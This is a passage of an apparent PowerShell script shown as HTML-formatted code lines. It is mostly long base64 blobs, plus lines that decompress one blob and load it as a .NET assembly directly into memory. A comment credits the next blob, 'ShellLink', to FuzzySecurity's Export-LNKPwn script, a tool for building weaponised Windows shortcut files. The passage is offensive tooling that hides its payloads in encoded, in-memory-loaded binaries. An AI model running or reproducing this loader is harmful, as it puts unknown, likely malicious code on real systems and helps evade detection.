xfxplCxQP4HHeaHeRBf8v9J0quM0py8H0z5d99CoUPcHzup4MtEfOdTr9J9oHppRkvSc8QzOzd92qE&#x2F;6roC6dWNxPC8NF6jrdC&#x2F;NCPXlwHmMYNB51RZ4HzH1xw71YaoB9TqHelJbr&#x2F;vpkY3F8fz0s43F8fw0s8n1oRGSWlNx9ABVF6gteoCampR&#x2F;Qxg9SMdVW8BrMDXlUB+jVlAZh3qcdoM62+RG4gY9RHc3uZHYAuqBpqJlq2j75qJlq+ifN7uW9ejYuLaq0dn3MvJuVVo8vleAKnOodb4joFYLdZ&#x2F;4UL4onuVUv9WlRvVy2rW1GM&#x2F;raMDRclyo0gheR6922v5Jv0LXkeVQ&#x2F;6ZXgprbWvShkn62tehDJV2MFqPrfsL2ZR9Lhuk124qSYfrAtqLVYfrTba6dr9bD9EVFBWo9ll5VsOwB30lQX3PafuHNgPr3lqItVTSwvThClewg7+btm+7XGPt9jE&#x2F;JHtzgK3JU6xW9yCnlq&#x2F;oL+sq92jzM7&#x2F;Zh1g0NfrA3a4Eh2gbEjiS4T7BTsF&#x2F;wlYLjggngakpJ&#x2F;bTgOcF7RNsVwTLBJ2kD3kG&#x2F;Iq1P0yZqFc4e+he62bgJ+GZ&#x2F;HJKf004Af+A7BZz2n4bkc8Zd9At6t&#x2F;8+uiR6LtGk&#x2F;mbgev87geWe99NlidnTONh9Bno+rd9E1SJZLXqqRc9b6XX+Z4Bnje8LVgKr&#x2F;f+JVh7xSfpr32kKaqf0nwKfM34OfMK3SnuSjulh7TJt8KzRNmicT5dF89OUoY3a07SdtgFvpVZgJ+0B&#x2F;p1+E&#x2F;Areq+W0B7TBrSg9ir&#x2F;T8WLuOanKE0At5MFbKUZYAedAu6lDPAAnQYepDywB0dPP91C54EDdAF4hC4CR+he4Bhm0E&#x2F;H6EHgCVoATtKfAGfwjPPjFPFG4By9BZintwPvoHcBX0OXgRfp&#x2F;cD76IPAB+jDwAV6DPgIfRT4Bvpz4FvoE8B30KeB76HPAt9Pnwd+iL4AfJS+pG2gOynijWHlf1CPIV8&#x2F;ClxP3wBuom8DW+gXwF10gydGN1AnsJtGgK+gaWBc+K8STOLUEKNT9Elgjr7o6RTNCcF7BN8jeFnwCcEnBTdp9wIvaiIj+ITO+KwgeRhNwScEn1V1r9QFN9AUzSOLHsOZ&#x2F;in6Nj1P9Xg2aHgme7CfG3gah4jzNyAnrTmfjZV0RT8DvEvqTxHjl7S7gXHhBAzGL9C9IvlAQbLBd6lQT&#x2F;qKvV7Q3wRs87wNuODjFd&#x2F;te5+uY3SPfJrtgzVsh45I+4FlcnYoB+o40awCVoPSaTX2Nh3HuzBa1wB1nNuqUF8L1HGmWM07AFo0agTqmKW1wCbMmY5TUj1wC1o0bNyNqO&#x2F;EuUNHhm4CtqF9HVaI96I61xSvAU&#x2F;x2wu+xrUHpXkx73o5MO6gIWgdokPqu4rRkeNH+9u4APb3ZuZnLTsxkbZOtNFAKpdHMZI92p&#x2F;J72pHRZXSRYr+dqf1+g7VilJapVA43OHItF2vZFCKzF6RERzeSwcGs5PzaesmJrsGhrq47B6I40A9beWPo8ipgqm+rD2byDu8AoEO8ZGh4c5DvVzt6x&#x2F;oHekflHpP54iU3X1C9Xb3D3YOcPXw0QEpu4aGpBztHY73Dx3u7YGm4d7OQaXTrfUODw8NK7HuEVXrQiuXA0cKlduc2tH+wyPioSo6h4c7x8UIwd7BIyPjdCaRnreOH6eJBM3mklk7nZqg+Llc3pqNdWfTaSuZT2UzudghK2PZqST12dnZvlTaGknNWkfzSeqcnJR4DFs5yz5jTdKh+dQkHejvuenU8eNdieQpvK30paw0eG6UlrccsbNzlp0&#x2F;F89n7cS0tVzgcGJ2Be7IuTlr0u07yn4skxmxU7O9mUnqnJuzMsrSo5lUMjtpSX3JwDKZS3lx+J1Ip84Xh3JbRhKnLCqmK1KrJzuvKnFYkFZjsO2iWCrq&#x2F;U2qyENr2rKl3pPIS0gdQwdSGdWZXaRDVl5Kd3whCnNkX81EGWw+mZ9HrTs7O4dZs2UaMdZkZx6GTMznLZmwItVjTcxPT7M7RR46j6ZyqUW8zlzOmp1InxtJ5Vdk24lJazZhnyo2jSRseNRnw92z2dIGtw+n1ahl55Bvyxu7s5mp1PQ8bF+xucfKJe3U3OLGvnRiOrfIDcRAFAxb6cQdUsst14UYTiJsK9kwd85OTc+s2DQ7l8icKzYMz2fymE&#x2F;h51MTqXQqX9Ia7zqXVxMsaVuY6sXZLFmzAnv5dCv+mYIuJ0PjkCnkYIGQ3ChQ0rVAHUlMTiI&#x2F;kdVYI1xx0sxxJ+bMD7cgySWXOT2dGmsYsDLT+RlalIixyXRa7aHQ5aiUhUNd2WzaSmSUJUp3YUhrytl9qNOexiLL5HvvSFoyxzSIqFt2f2YqS&#x2F;FTqTm3D9bNaeqeSdjOOuuaT6UnLZu65qemuEjlkUdnYBeIWBKmuR17UonpTDaXTyVzS13mZQpnEPQzqaS1rNldWYV2tYIwOJ4mIBcHorAicxw2zoKlEpK01Ht6PpHOObuB2jjdp9LxoYmTiEvxuYBHRSlraLjI4LD2WFOJ+bSqd2dhtevBCH9lz&#x2F;s5m9Fp24lzmNPSuiq70tnkKU59eYSfjuN8fx6na5OyOC+ZOFPOCBUH2mhL4MSpJCZxSrUhNSctebwLxIFZ1Fk+hfOdCVlkudRYTwInaRPnXxNn4ztx4riAdw+a&#x2F;78fUY2lRm1To+4s9nTH379IshXnaKbGlHzbqNgxf035&#x2F;W6PNf0417PM4ha67er+5sVfrBY6jNFmr+HVvsVxTLwcvRnI5lFaeJ+bFw9NicuKMdvtxiwBTS85DhtGZbZykM5ivBUisr5PtM5Cb57cqCmNdPa3kR3K3heLZfvSrOxebPXLitfgnfBlN96FeqRsxb0DI&#x2F;Vi5rpRawOnjbpQ24d3p320B7VW2NGKv3bw2yHVB34nelwgbac7dy8x7lWufEk0X321aC7V&#x2F;bL8DSrefow9gujPLR57dXEFlXBxPfKp&#x2F;Yl33X7T4ccXfjRy+eG9N5PX1LSAxyTNh0o4zGQFg26sjvRqkcqA3xsJBIORSrwpVVTUGaQH630Bgzwg6iorNX11ZF5rIIUBT0jzlVVqWr3LYa1V5PXrwQCqVcRDBaAzACWsU6v3BcvIp0Uu3hPgO+Dz65F+lo30Vxgm6hV1XpMi&#x2F;ehX4fVD3O&#x2F;3BMNN9T5Y4mdLxMzqkN8HleHBQKQa4vW+cr8&#x2F;UhmEqcFIdXiQraj3AXXUiSIXX4t6va+izG9EalmKFYJV4aDHhyEvPoTxwk0YxxCP9YAqQqpYpYoyVZRLoYUvfiwkTvkDnzx&#x2F;bHRtx7MP8kdEGuHFU8d7p5d0xJFNhzqoghqElfRK0vFmGSEd75TVpOOdsoZ0vE02kI63xoOkd5LeRXo36T2k95LeR&#x2F;oh0m8hvR&#x2F;vkZU6mX5nunQj6DHCgw5Z7TEipm5UgNXkgRe64Q8iFEoU5kbgEgIbDJjk8ExdC0ZMToAgGnwsU40gup04uCqcCLXTqZqFKut9PE0mN0VMVlMRMf0oOLLcqQnq&#x2F;LjrPFGMF3XGA+HzRqHS5VSDiphgVzC7CRU&#x2F;7rqA5vxiroE&#x2F;7h&#x2F;Ra26zE3OHs5nCIWZkxs6ezWmQUz+UMzVav+gsYHanE7mcOZCasBM2Hr+dGh2IHe4dWcw3p7I2&#x2F;0gRZ48cTh1m8XRoutpMUZcjUt&#x2F;TRDQqj1vJeTs1dc7sio3GFGvxuwNt1sgsnHjNL1wxzfbWtj3mko7bNGraN9k6tau9bWKHNZFo29Gxr21qR2KirX1HsjWx29q1J9G6K3k9UZlG&#x2F;tZYW6w11oqtT6M6dqXwOrDdOf3deKYjtjvWjoBVVBcae1K5uXTiHJ9iqyUAhRZTpL2FDyLc311yROv469pbcDcTDcd74h0febR64s03dj4eqf&#x2F;Q6g9cynCn7v3HjuLFNXdsYteuqWN4iziVz84d6z4ycGxRNJZQ2YmTx&#x2F;AKYSVyS1pic5Put22&#x2F;P9ex&#x2F;mL9jPu71BWumf5SCmdJuyedHkykMuqDA0sd8&#x2F;l6YTN0VK6o5P&#x2F;10sSIWvUL0kV8nvvWFfh88W9Hx04QeUs+uvJ6O4CjeP4dB&#x2F;bSMGr9NITn4nGUh&#x2F;Eclk+y6HPe&#x2F;37e1V&#x2F;USHSzq4eW&#x2F;SyWekSOn3429KTk&#x2F;NGPJ+sUnqN8NUmvETmnZPDUTcs5SJ071PVR76SHdZSe5JZrOigyrYW&#x2F;DprgGNDr6UbwuyEzK8&#x2F;4DLTwF8wx+NWLcU208ZjqTDQAvRNii41nuCm6bZRzcrZKOmcnZcPKpzBz2TnMLDmny1fbdIAqCjbNid&#x2F;nCmcQvlhvEmcF1j0lGrpg76j8vvUE8Xesrv89ojMpknOL4vZi7wpX95jzJlCif&#x2F;E5kKQ9hhNPTMpWmd8If9cicWXZjESj6M3V7YghWmn5HQBHTYMleEuX3t3S45x4NY0zGv&#x2F;2ejnPpCu4+fTKJ8k9znxcLW7NkrfFMVTGTYKeFd9POXPD14D4NOSMlXJ8cmOS+Y18U3OtJCdhWxIypXN9dR2EHA4s67t0RpbOx17p0ymzy75NwAqOxLX6&#x2F;eH6PbgOqt&#x2F;SPLDvd23IH67fxfW&#x2F;&#39;</span><br><span class="line">$DeflatedStream &#x3D; New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)</span><br><span class="line">$UncompressedFileBytes &#x3D; New-Object Byte[](13312)</span><br><span class="line">$DeflatedStream.Read($UncompressedFileBytes, 0, 13312) | Out-Null</span><br><span class="line">[Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null</span><br><span class="line"></span><br><span class="line"># load ShellLink (copied from https:&#x2F;&#x2F;github.com&#x2F;FuzzySecurity&#x2F;PowerShell-Suite&#x2F;blob&#x2F;master&#x2F;Export-LNKPwn.ps1)</span><br><span class="line">$EncodedCompressedFile &#x3D; &#39;1L0JfJTVFTZ+3neWzEwSSFhCCJAFskwWAgkICSJmspEAyYQkQIJoMiQDjIRMnCQsKgoVFxRFxI2qFaxWRetu6y5Wbd2LFre6gdaqrW2xVaut1e+cc++7zJJI2+&#x2F;&#x2F;7++L5pn7nHPuvp1733dCw&#x2F;JLwQIAVvz97juAB0D8VMD3&#x2F;2zB3xEZD42A+5wvZj2gLHoxq3VNoD+zLxRcHfKty+zy9fYGBzJX+jNDg72Zgd7Mam9L5rpgt784MdGVLdNoqgFYpFjgYOMP2rV0D8PkzHhlOsB0BcAhZH9txHAmBjoVokkcVkW56ceuRd6rsJx+LNB5LpnS&#x2F;8an&#x2F;iHMMV0viHTLrBD9s0WBBPxY06DAxGNoE&#x2F;0nUy86&#x2F;ziQ15l48YB&#x2F;4wB+flUs6zXdKLcpic7iUH+oC8NcNqo7VbRUCbOrwP+LQ&#x2F;6eIBomyDJzWmVRdpWRxTzUKGyobCrY4IWzAK59CUCJNDzGnwWq+wsspNp&#x2F;DqI7HqHApRYAjJ6ugkfhdJNV95cod6lurJO9yG4f1+kqtNkzvu1AkV2IUoXoXyRykGjAnnGORoJTFJRY7WmdmiBHCNJ1QR4JMIEkXZIvJZm6pFBKKnRJFklG2jO3UFtzAThPF+kuolK47JnUsKhz2DO&#x2F;+9d33+nq7Zo6SVf&#x2F;xaS+WFNX6OrHTerdmhpTl2pMXVfvIrWD1A5U2wvS1TOwHa0Fk1XLZg6gQNUEqhRYNIFFCqyagAOlqjsZwOUeR110Sj+NrJygi7tuE+W5g+TPqe5EUliDFmyanHH9mfRhCRbhR9CpR7H030RRLqEop8ooum2BZltwj2pxjySdTSQXpEa3cmIiHaspnWbNWFq5FSqnarGNsLqTIuWzLGoQJ5DdPQqrVDB6ugVO5vGMY+2MRqytbMdtCG0uNUjDb1xHUZJdDMHgvQipbZomtaNohF2MxOBBEUOMQZLyOJmqkNSOwxrHtR3+ArTWQHIKGo5B&#x2F;cXpOM7j0RbNUuJSRBHco7FodhE2lWG6LMJ0tg0vkIwyRBmLZBH1mHqBtXjRNSiSFdDj6NXR4pjqJxtNt9WbkG3jCnhO4zChNTi5HyvuogSc1N1jkeTqdRyl1SEFxWZdqtDZI3SirKO00pg1ehnSSkZpRTL0Ioz9b4OHMUMblUsRS40LixWvptBwdyXEce48zTtSvrUk2oUg+HcEDH9F4a9F+B8U&#x2F;qcIf0Phf4nwtxT+ToSBqqwoHFYpbBFhK4VtImyncByC6sARC4VuHJyFSRCntVEu1uaPlKaNpmCKOw3LOdqqJltxGETZY7tlo&#x2F;1HZB8n7Kleo21qsi3aOq2j&#x2F;A4gU2rNqQl2J89MnpJaRnZn0QKhd09ArqZyKsn21OVui5ZccBJqxl2cg2M7mE5Nnk21IZvwIhZWy5QyzCkdQzoxKpr+&#x2F;UWPi130uGGLnstZxh1T0eOOIZ0YRc9I+v6yO2KX3TFs2d2cp+OYyu44hnRilT3z+8vujF1257BlL+A8ncdUducxpBOr7BXfX3ZX7LK7hi17EefpOqayu44hnbBU1EsCaaUJOKevp5KT22QvQFeqlGxDaNfnnkKbYrHqnkh1HPOthX0qC+yiquI6lzGGFt&#x2F;JFDuTMqSdgiqn7XPZ4ZrxtMIut6dT2M3tpAobdz61kztXk1GK7jwqjxDKNFKXm9KnldgdrmM&#x2F;IJ0SsaQUKqkibQ6P6yyYI9O3ZIwpyJhY8CMtoanWlFMLx4kq9poqc2rbuFPb1pELY9NcGA7Q&#x2F;lMr&#x2F;U5Zpbl6ocar7kkineyIdIbMIKXgFzIZV1iRsPiZIkZYC8gy2bUy2aWfFacJ4qTAoQkcUuDUBBxgH8KHnRzHvnGa5kG4RNidhfml2FPSeNsVBZOyNE020ZCla7JJhiwjQROmm4RJmpCqXH4BN2KmST9G02eZhKlCKOaNaI&#x2F;JrBFxTU2Ek8koMHZIgYzjNsfJ4jjuiDhiLon+0SwnsqXeZeFpu2WMbHOMSRwjOyyG9NkssFGJ8FtKdL&#x2F;FHsLJ2ycaf0cezdspwrnIFtqTWUs578DmVCO0N7F24hBx32PtpCG0GQppqY925EemrM38WXPtocVslzlEKntYmzWE9iPWcjuGJ6&#x2F;NG3tIUckkO9rEKEEWm+QOl0o9m7gjTUw+2mfieJ&#x2F;cn8o+2iWBjDHTUkMbKN4lgR0YU3Hjsunqx2xcp0sfpxdVp5aMD1kt0GfXzfIMszQ2i1fThaunZiRwIDFltDVltM2uZiQxD+KAsTuwMmPUjDHCe7KqGamaH2Vy0kbbxdqebE+2p5AfWziubZjlndbpOGyBE1Xnf5xGjihb1Ss4WFNGx6EXaE4qZbSjcCKm5Ng1dSR9jGvbNRU&#x2F;RscVJhEZ7Uh2JNsvCYxrL&#x2F;2t2N&#x2F;QKG7Y&#x2F;PJkmf1h&#x2F;iPl5OScnCInp8jJyTkhGe1Mdv6bOeXzznaW6v4x6DvbQgpmVPCa5z6Ztrm0zBew5viBaeylBdOlLZguuYLGa4J4KUjQBAlSkKgJEqVghCYYIQUjNcFIKUjSBElSkKwJkqVglCYYJQWjNcFoKRijCcZIwVhNMFYKUjRBihSM0wTjpCBVE6RKwXhNMF4K0jRBmhRM0AQTpGCiJpgoBZM0wSQpSNcE6VKQoQkypCBTE3BAnHU3qnKfCu419ikOR+xTwX0x9qnp0sOgfSpVykoNWYZLE840CRM04SyTcIQmLDMJkzThHJNwlCacaxKO0YTzTMIUTVgRveGp7kqTcKImrDYJMzVhrUmYrQnrTEJ32Ca6wNi0MookpQ0rI7PUmjGvMNEk0vfURabUerQsGnUfS1P1aaqmKNWApmqOUm3UVK1RqjM11VKjAHyO1uRtJvk2k3x5ZFKZF5i0K1CLoh3sgxDBvaACa19R6NC43L5pDF4t70l5785R3TeAtnXnhHZaaNehcbZjsr6F5oitJyf0c9aWDqH9hLU09HYU6Bunrh1nJe2sIbQ1rC0bQruatXOG0G5n7dwhtHeydt4Q2ldZWx2+2evaz1hL43HHlOj6JttIWzdE3BLWLtD3b13RwIpFQ0Rbx1oaijsKo7UXs7ZpCO1trG0eQvs8a1uH0P6FtUuHqoydtG1DaAOsXT5UmVlLo9CNHeAK&#x2F;RR56G6EYKHc8HVjw7cZgWPUSb7NVOnb8JaG7s399uHcm&#x2F;g44eBkhUrioC+OC2vn5ZWD0Y5OgsPOK21xVugijOHYgRuiKkQcNMWwo09Ex99gCR&#x2F;nMlyCzRAsQbDjBBsh2GzBkgQrF2yUYMcLNkawEwQTB+zgiYIJdyroEWyiYFWCZQpWI1i2YPMFcwtWT+6m8AsS1YwiZ0pGhVgFeOF0RjkXC0XsHhG7QbA+ZinfWoJeIRjQBYuFYKMuaBGCM3XBEhbwAicSXSYE23RBuxBcoAko1knk0PBiZg&#x2F;yyqaVGzdVdnzoBMwOkMW9iuiIjAR0dqzS2cnStt0sse0CjSech&#x2F;&#x2F;FvuuHyPOhveC3sZbPv8TRWPfHnCdicMvz01X46aLx7dN89wQc3BmO&#x2F;+Xg5g5ZBeLuxMLOpfAwe0SbW6wmKu&#x2F;u&#x2F;6W1q&#x2F;tj9kivwxqE7iewONGUMnD&#x2F;jMZhioV3YCtjm018jKfLDtEZ9oz4jFOvFUYvow9cBGbvQ8pl7FRdLf0QHtAWzQmQWWmH4QmcrdSlaro2a5SRTTNKCysr2trCvYe7qY36H6F+n0p9uj7MHw8ZwQFqqaX6YA2JjwHho4+xsI9ul8M2Wxu22dJ9zNEEOfo4tsN9&#x2F;8U4lof80wx&#x2F;KV0yql2mBYtcGscfhfEmhdnX6jfiZibQU1IhMce308El0aSQzUa+h5Xn4VC+x2InTZ7TonfMTazoj1RoE4rm97eYZjzNp3XafkHNi1PqZuf&#x2F;akplWrFB5Oqb7kxhKtffjJjrLw2PTIcqI+F5mps42ZrCQtPSnWyNijvA07ZUjrtN4eNus&#x2F;g4W4w7RQ64XG185coBl6cJ8ozzyv+F8XZm2Hg7c6jxdmas8XZW1Hg7a6jxdta&#x2F;Pd6yXDSszowebx5WnPV94y2BxtvGiPG22vX&#x2F;zHjb&#x2F;F+Mt7PBfMXeP4MegV6r7wsqfCfbPU11nyuPLvEiyLVtU93nG+LzTeLthni7SXyRIb7IJL7YEF9sEu80xDtN4l2GeJdJvNsQ7zaJrzDEV5jEVxniq0ziPYZ4jy6mWeXWZpVbTrN8TZAvBQWaoEAKCjVBoRQUaYIiKZiqCaZKQbEmKJaCaZpgmhRM1wTTpaBEE5RIQakmKJWCGZpghrxnt0Gnajyr3wbGs3rqWXo8zj2sP&#x2F;LW+1t7PG4MAJfodopzflic8yPjnG+Os13G2R4WZ3tknO3mOBfJOBeFxbkoMs5F5jgXyzgXh8W5ODLOxeY4O2WcnWFxdkbG2WmOs0vG2RUWZ1dknF3mOLtlnN1hcXZHxtltjnOFjHNFWJwrIuNcYY5zlYxzVVicqyLjXGWOs0fG2RMWZ09knD3mONeYbNPkyxG0hpQN&#x2F;YxBDrhR2pAyv+NwvqY5P1KzXdNsj9RcpGkuitRcrGkujtTs1DQ7IzW7NM2uSM1uTbM7UnOFprkiUnOVprkqUrNH0+wJ1+jPCMRzmkRqQ3qfjPapNNyjvhl+jyqbRw&#x2F;TxEaVHloVr21UQz8uSHCwV9FeQ6&#x2F;PlQG&#x2F;OsKvtmA5APdRwBj8qLEPf1fi7y3424q&#x2F;PyT7H9NJT3V3UiXOQyi7RQgCJLiABFcJwQYSXEiC84TgBySgN60KNyK7gxi9&#x2F;FR4KrKXiF1KbAWyz4ldRqwR2WgaSJcTq0CWTuxKYqXIaohdTYzeEWkk9kNiKaGn4rUN2NxocWHPobVtPq3y4W+&#x2F;+074IK0RPogxjHNCrgTsCsMBiHBE5rJW3+xjeCPpYgfWPT96Aczk+d0qPm4D9vzipOdXoa3rFXKh92gCj3gu&#x2F;H&#x2F;F77sFzH4fs1h+n64w+337jbjS79sfGV&#x2F;z+3TFv+n3cb6x&#x2F;L79kYpIv28EzacbIdzv60n4f8bvo0Hxn&#x2F;p9NJJotPUXU2fdBfzGYiontLmS3xRkh9DivodUOLSqtKFVJX0IC6BHAiMxw1RXSnzheLs4T8cFp1H6j9Ge8LIrblxbfJxQBNFfcZW+aRf+Rwfw+8fJqvtefVymxKckFBYLawcnk+gU+4k9zskpik1FhNviHePaEhzmxJ9Sz6Cyo3mq9pSb9p9pcg4YbYUj8z5qAHcnpp7LbWSPbCKKawW64UrmcnI26GK5LG4&#x2F;xnLZzyqlpkOXylUUZ3GvNslmkqzJnlA4x5HqPo5GQVxq+8vxcaJzHc6UOLo&#x2F;dzn56gH7jdPGTqJLCEeciOFwz8aPl3PiU6c&#x2F;ZHevorVhArY5FgBGcXmoAimjwO1D1dTxdrpzd8W&#x2F;m5LL60f8u4l2dzdq3mZaEEf+vMIvbieBczw4x9A+gOFRk6lpxF3WIvpkn9CSUjrCYm7ZlNDXOC8spllRTkMW+z01Rr+LbreU&#x2F;o5v+qigPJfXDLN+TkukKUtjIdbtfhdrfx49089lxf2xZ&#x2F;osNUU8TKVmprtGOaQPgHa+sfEmJ+69HjPWRw7Lp2H6w7DHqb3tqSKgP4cp1Xhq28s0Taq1aVItzt7UZ8dpfcaDGXdYx5b&#x2F;oN&#x2F;GgHOS1m9jYFSu1m92OHOYdt3DDfTYsO36RHS7PsgKqtm&#x2F;cde&#x2F;nkuJa+rDck1NxfX0xcSh1lO6IY9HVdy09NCkEbSaFsR2TnA6t3PPBKnn1FR7UPRFMKwnjM3yWfqwup8HvlKeiBtmvNwwa7TeqZEbZq0mqDXdMdP3DMb+x3fMz6AsfpRCT7lox8xIkvLnDFvtYapdrDGhYfY40UOUpjukRHXThhGadsfY6N69jrXPxfRJzHvhA8LBS+5&#x2F;SvZbxkTsuGdH&#x2F;K82wowkYxd0av3r7D+eRh71rfFE5XnexdaHvSD4NujBw2Ki09p2MTmaPM9f5kq6XwF+QacMl683qb1bxLvsqvstzQ8Rbwge0XzzI4Z&#x2F;wu+fcwqpIoV3SJcGMoX3wlP4QEvhg&#x2F;AU9DuWElm2jIlGuRJkzlZ7mimvBJkaS&#x2F;ndQiq7eJ4sSiHeM+wsqJUqNaVAVJlaKVxirnjBQyJ6UbaQFo1V3YfYRm+OtnFtWlIplNg7emKvsqHRBlq9quW4llWZI5MulVlhFq9xTL292lIpixj5pvA50qenx42wTKbjNdI9ItN9nZM4Ep5uZGbjhhCm0MIwX1sY5suVok4T1ElBvSaol4IFmmCBFCzUBAulYJEmWKS&#x2F;7&#x2F;iR&#x2F;r7jQdP+czB6reGWj1xrXoHI51mq+zemdUZ&#x2F;3&#x2F;GQSai&#x2F;7&#x2F;iqSai&#x2F;5Pha9DIl8s6YWHUZN74coSeKZo54FUT6&#x2F;dz02guIEb2hP36RgxoTesOUUGZYQh+YE3qDE&#x2F;ogZkJYooVyRAuXUbSEaZCbzzRvmZONGHDhpVsoR7aWaMRgNyf6njnRiIFlrPcW7ft6sd+5XDSSFu2D4Yu2&#x2F;tbiNta+PIT2GdZSwWnVjnwj88+s&#x2F;c0QcQuSSHtoCG0fa18dQvsSa1+LqdUGz6wmvZ&#x2F;S7aG0ZIrx+hAxZNOjXS&#x2F;bvTGMHaZXqPWy6eYk9AzHfEt3bSITH6X1ojnSnznSe9GRZB1q9TzHYx1GkfGRIXNAk0Y2+SDSxPTu5yCOhXE0Fn5t3nsvGHUse2966K+jjuVOJ2PizJTQ8tG06eZFJCgeFidqb4fSu59J2ruf2vug+nY7Oi5ltCNltBMTnJXuxEZwaS8zjHY4U5mKtxlGO0m7Ivx9TZc92eXuoJH+W5oaYW9YyiNuMv53DK+F0g5P+WEG9sgMiqit3+UM4v7jDMhvcGRkV2NBgWqyJmV0vJpsfhfWlTI6oXAiJpdAr4Tih3glNGF0fGESkdEJyQnJrrBXQl3J8cNm+r6sFWaWqCY7wzMbwZmNEJmNEJmNGJ2ImSEZPSJ5RFRmicNm9jt2nPBwdift57gliSsAcZ6Yo5+J6DyW2qbtSsQiT0UPgjwVsWm7&#x2F;nI5rXN7MJ1UGtsfg3Fnec&#x2F;oYzkPpIwZ5jzAh2n5FRPt2yfFqvtJzCVBppNoD4pbBDpSxznJ3hn2HZnU6S&#x2F;xYy8+MvTPpRX6Mwh7I4Wpfs9B5+KMBJc88B4FOvCeQC05j7wG7Z6D5PTSjws7Ao8dTnnsaND2&#x2F;Qb9+ctGTHM8ppnuMp0y4s2njLgYp4w4ufOLe5KjXEMqRaIzWMF6u5MLJF1mWTh5T2IU7qk4vlOm7zqnmfch4+CB9ZwYXk9jmYyq62v6emaHpzHNCZTmp2B6H+asMf+rs0Rcmjg6JmJAtKFTa9d0Z1pcuhixTreHVz+6hKmkin7G8+N9NWPRZv7ebMg2Fvr6q1C12Wvcjo110zcc1XFuGz88DZCTQd9tpD5v0fq8RTp&#x2F;rZqgVQqWaIIlUrBUEyyVgmWaYJkUtGmCNilo1wTtUrBcEyyXgpM0wUn62Dtekedb&#x2F;hKunN3iy7nhPucZVFfjLJumnWX5C2ZRnuNXsTxH+t4ovZbJLmK6FH5jEmZrwm9NwiJNSF8p1dKcqaVJ3y3VXhwq04RWk+VcTcjfNu1TjFebK+S6dUYT1VYKKzXhYqMJMqq1Nmg2CevCzu0PDf1cyx7y4oARjRrLYzqHtdS8poO7rt1HWm5kihvpxz1OWm7tHVnR2o9Yy81eg5Id06OTj08hk2+GMylkk2+HM6lnE+qgWBXcxFrqKZ70EdqrWEtdRmt85Bd8uNd66W8QHGcPPcimumgHzmpV8h7iORS&#x2F;1hS&#x2F;cIo99I4RyTCK4YGJ+49a7MeJ1I9fyDXrVDt3XO+0KaEvMCW70Y2x3CyxiAmj4rzQ4nGYt5CJlcyIHX3HEa+mxaXEyTsO93xOh0ZFwih+TdoVF8RF2jU1N&#x2F;Q4phrHVyA8YOzG2Al7+U&#x2F;6bOIb3Po1ydcgXzytJ&#x2F;ZPkK+aMvuXYEWCfSfYTBGPv8utZpTR288u8W1uNWOu0NkEq+Dttv9U7WvdxqYqrmCSlLBNlemPVPdIRZ6LMipKR5kofZ8wva2A3yPFDdQhN9AV2iK2QnuuddJ&#x2F;81xLHC05U&#x2F;25ll4E&#x2F;fHTL2M+c0qlkTUy8irO9E6oHR7Dz0k0nuIV+WyJqoPb4Imp&#x2F;7NtML3duFPTdr2h3h9O4n407lPHK3yfOkHh+9Qk7Beb7JeTtX45We42p2iCU0z3qR3&#x2F;RV+p7lQl+o4jTYm645BrcuQzWnPf3c99R+ntyIj+FoC4LU1Thr4tJZ&#x2F;pJkw7ndd82bcZSdix7&#x2F;3POlZ&#x2F;33e8Il9fZzaBu3AyuiaZStizj8nSPenQOqpD9lynJuiUAp8m8EnBSk2wUgq6NEGXFHRrgm79GSE95FXle0b852rosE5&#x2F;X2bqSCGQ074wnGp3rDmRUXLCo+RER8mLjJIXHiUvOkp+ZJT88Cj50VEKI6MUhkcpjIxiF&#x2F;d99N5VBrdHSrzqpj8wwvMhQbZOr6kVXnbZtfenHXHaeYv&#x2F;NE+eXMGm6CsYGrTZ5coVh4G0trb4wix5LxVhJo3Go4ls4F5TQ35&#x2F;rjnHlmvOMLnmyVzzjj3XvGPLNW+YXPNlrvnHnmv+seWaP0yuhTLXwmPPtfDYci0cMlcHr1WPwzDvXfFwG28PrRpPy94UfUPTvbAcaXAeG+REG+RJg&#x2F;1skBdtkC8NnmOD&#x2F;GiDQmnwLRsURhpIJ+0nYi0PTU4jq4W0vC2CmA8hcRtv4M80nlTaflwzzPPRIkpU&#x2F;M2kY3vQeRm&#x2F;IysvM5rTYq77BfvDfKB5FCH1YnbWKkzhSlqLsRnm4Cc6PWmZFtpWz1PdJ+jeUVLpSDOtayvI4JdR&#x2F;dpK65dL7ypNsEoKVmuC1VKwRhOsET6UDUYq&#x2F;82+PCfGvnx89L4sx+oJhrOVkWSqkox4It2u7+RWEWdNUY6Minb9+SmZjIthMt0w8QyRSma4SaxUkjQTuU4&#x2F;OIwf8RQPxONjego5oXdZe0Kkh5gT+oYVXNMfUwHYe5f1MgTiLKNHSptAkTyRkTzDRDL5oja4U+G&#x2F;n5fcP1vzVzpx3FZO+F&#x2F;5K9qNszOjbWZK6BEshzPyUtrwYuZimZ0Zde3a+00ZScnWlGSr9khYXOlGv9tE802er+gaO4litCXbUpJtWkwxAYM0Ge1B7pFkGx+ubuTmzciMjsJm48LNpg+ZciWn7IlOuSJGyp7IlE03k3Q&#x2F;614YfogSFBe7BTTI6OKVFo8E6ZMHtHke0M5Ki&#x2F;8r&#x2F;5szEU+&#x2F;0kUs7fhQsD&#x2F;G7JARjOtC41nH37AcWTQWa7Wx6MKxOGLi&#x2F;3Asmq+E09sTCxfrf3Is2VpUl2yVL57gMEo195kz2dqeaA9yTfndLZvxLbKwpx5J4Ew57jbyxFPcTdRtq3RPvFnRN4iTpFN+qtZ1HLhHdS8m5zKZFszl2oJJT6gzxpgE&#x2F;IeGKPZaLfZaueL3aAIOzJHJWfAElzGmYJakagoxtF6nWXNgv5a5XL+Xa+u39udrDAGvl8&#x2F;pzwxaFOM5dosSNcbcrUr0GFsaYy9pi95LhDBjzIwTVHe7SZ0Udq7XS0aXk6aGkm5UYXZklcSWpNuFPcP4zdA+lD20j4YuVzLWFdibrKXq7siMvqf7O2uXDhF36iT+nnZMrd4K6fZQkO3ah0jlcdYuH8Kv4v3hc6zfZDqP9DdpkzJpemroyKRjewC5MH2YB5B2OSWDS2g11A6qy2jcyxUeK1GjPXHMjcsY0y4PQxljHCkOfZmnbnVErfI0aezjgjSNCmfE4QaufUE6yfTW0BBvznLcgiuFu6haMulbTh2vuNfxzEzv0nhQES9hCyuhtgopTpgPtQnzoZxvv9cEHKhV3XRhmb5SddMdZOfL&#x2F;A7kJulXHCyktaiR2iCVvpHtOuszBaw5U8flnnUUA9&#x2F;aN2Cc&#x2F;iZaXreQxm